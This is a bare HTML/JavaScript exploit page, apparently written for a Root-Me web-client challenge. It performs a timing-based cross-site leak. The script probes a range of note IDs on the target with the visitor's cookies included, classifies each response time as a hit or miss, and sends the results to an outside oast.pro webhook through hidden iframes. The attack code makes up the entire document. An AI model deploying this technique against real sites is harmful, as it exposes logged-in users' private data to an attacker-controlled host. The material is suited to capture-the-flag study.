<script>
const TARGET = "https://web-client-ch56.challenge01.root-me.org:58056/notes/";
const WEBHOOK = "https://85531c6a18bfcfaeb4aegux4iseyyyyyb.oast.pro";
const urlParams = new URLSearchParams(window.location.search);
const startId = parseInt(urlParams.get('id'), 10) || 1;
const THRESHOLD = 500;

function testId(id) {
    return new Promise((resolve) => {
        const start = performance.now();
        fetch(TARGET + id, { mode: "no-cors", credentials: "include" })
            .then(() => {
                const elapsed = performance.now() - start;
                const result = elapsed > THRESHOLD ? "hit" : "miss";
                const ex = document.createElement("iframe");
                ex.style.display = "none";
                ex.src = WEBHOOK + "?result=" + result + "&id=" + id + "&ms=" + Math.round(elapsed);
                document.body.appendChild(ex);
                resolve(result);
            });
    });
}

window.onload = async function () {
    for (let i = 0; i < 100; i++) {
        await testId(startId + i);
    }
};
</script>
